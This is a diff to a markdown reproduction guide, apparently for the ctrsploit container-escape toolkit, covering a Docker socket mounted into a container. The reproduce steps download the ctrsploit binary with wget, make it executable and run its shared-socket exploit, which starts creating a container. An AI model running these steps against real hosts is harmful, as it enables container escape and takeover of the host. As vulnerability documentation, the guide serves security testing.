@@ -18,6 +18,8 @@ Insecure configuration
 
 ## 5. Reproduce
 
+![](./video.svg)
+
 ### 5.1 Reproduce Environment
 
 ```shell
@@ -46,8 +48,8 @@ libseccomp: 2.5.5
 ### 5.2 Reproduce Steps
 
 ```shell
-root@localhost:~# docker run -ti -v /var/run/docker.sock:/var/run/docker.sock:ro -v /usr/bin/ctrsploit:/usr/bin/ctrsploit busybox:latest 
-/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
+root@localhost:~# docker run -ti -v /var/run/docker.sock:/var/run/docker.sock:ro busybox:latest 
+/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
 / # chmod +x /usr/bin/ctrsploit
 / # ctrsploit vul shared-socket docker.sock x
 INFO[0000] creating container with image busybox:latest 
